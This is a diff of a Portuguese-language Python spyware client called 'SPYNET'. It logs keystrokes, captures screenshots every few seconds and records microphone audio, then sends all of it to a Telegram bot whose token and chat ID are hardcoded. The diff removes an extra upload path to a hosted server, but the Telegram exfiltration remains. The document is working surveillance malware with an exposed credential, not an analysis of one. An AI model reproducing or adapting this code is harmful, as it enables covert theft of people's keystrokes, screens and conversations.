@@ -1,10 +1,8 @@
 """
 SPYNET CLIENTE LOCAL - Monitoramento em Tempo Real
-Roda no computador do cliente e envia dados para o servidor online
 """
 
 import os
-import sys
 import threading
 import time
 import requests
@@ -14,8 +12,6 @@ import soundfile as sf
 from pynput import keyboard
 from datetime import datetime
 import numpy as np
-import json
-import base64
 
 # ============================================
 # CONFIGURAÇÕES
@@ -24,7 +20,7 @@ import base64
 # URL DO SEU SERVIDOR NO RENDER
 SERVIDOR_URL = "https://sentinel-monitor.onrender.com"
 
-# Telegram (opcional - enviar direto também)
+# Telegram (opcional)
 BOT_TOKEN = "8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0"
 CHAT_ID = "5672315001"
 
@@ -42,11 +38,9 @@ for pasta in [DATA_DIR, LOG_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
 monitor_ativo = True
 tempo_screenshot = 5
 tempo_audio = 10
-ultima_screenshot = None
-ultimo_audio = None
-ultimas_teclas = []
 buffer_teclas = ""
 ultimo_tempo = time.time()
+ultimas_teclas = []
 
 # ============================================
 # FUNÇÕES
@@ -63,23 +57,6 @@ def enviar_telegram(texto, caminho=None):
             requests.post(url, data={"chat_id": CHAT_ID, "text": texto}, timeout=5)
     except:
         pass
-
-def enviar_para_servidor(tipo, dados):
-    """Envia dados para o servidor online"""
-    try:
-        url = f"{SERVIDOR_URL}/api/upload"
-        if tipo == "screenshot" and os.path.exists(dados):
-            with open(dados, "rb") as f:
-                files = {"screenshot": f}
-                requests.post(url, files=files, timeout=10)
-        elif tipo == "audio" and os.path.exists(dados):
-            with open(dados, "rb") as f:
-                files = {"audio": f}
-                requests.post(url, files=files, timeout=10)
-        elif tipo == "teclas":
-            requests.post(url, json={"teclas": dados}, timeout=10)
-    except Exception as e:
-        print(f"Erro ao enviar para servidor: {e}")
 
 def processar_tecla(tecla):
     global buffer_teclas, ultimas_teclas, monitor_ativo, ultimo_tempo
@@ -124,25 +101,25 @@ def registrar_frase(frase):
     if len(ultimas_teclas) > 100:
         ultimas_teclas.pop(0)
     enviar_telegram(f"⌨️ {frase}")
-    enviar_para_servidor("teclas", [registro])
+    print(f"⌨️ {frase}")
 
 def capturar_screenshot():
-    global ultima_screenshot, monitor_ativo
+    global monitor_ativo
     if not monitor_ativo:
         return None
     try:
         nome = f"scr_{int(time.time())}.png"
         caminho = os.path.join(SCREENSHOT_DIR, nome)
         pyautogui.screenshot(caminho)
-        ultima_screenshot = caminho
         enviar_telegram("📸 Screenshot", caminho)
-        enviar_para_servidor("screenshot", caminho)
+        print(f"📸 Screenshot salva: {nome}")
         return caminho
-    except:
+    except Exception as e:
+        print(f"Erro screenshot: {e}")
         return None
 
 def capturar_audio():
-    global ultimo_audio, monitor_ativo
+    global monitor_ativo
     if not monitor_ativo:
         return None
     try:
@@ -154,11 +131,11 @@ def capturar_audio():
         sd.wait()
         gravacao = np.clip(gravacao * 5.0, -1.0, 1.0)
         sf.write(caminho, gravacao, fs)
-        ultimo_audio = caminho
         enviar_telegram("🎤 Áudio", caminho)
-        enviar_para_servidor("audio", caminho)
+        print(f"🎤 Áudio salvo: {nome}")
         return caminho
-    except:
+    except Exception as e:
+        print(f"Erro áudio: {e}")
         return None
 
 def loop_captura():
@@ -187,10 +164,12 @@ if __name__ == "__main__":
     print("=" * 60)
     print("🛡️ SPYNET CLIENTE LOCAL - MONITORAMENTO")
     print("=" * 60)
-    print(f"📡 Enviando dados para: {SERVIDOR_URL}")
     print(f"📸 Screenshot: a cada {tempo_screenshot}s")
     print(f"🎤 Áudio: a cada {tempo_audio}s")
     print(f"⌨️ Keylogger: ativo")
+    print("=" * 60)
+    print("✅ Monitoramento INICIADO!")
+    print("🛑 Pressione CTRL+C para parar")
     print("=" * 60)
     
     enviar_telegram("🛡️ SPYNET CLIENTE LOCAL INICIADO!")
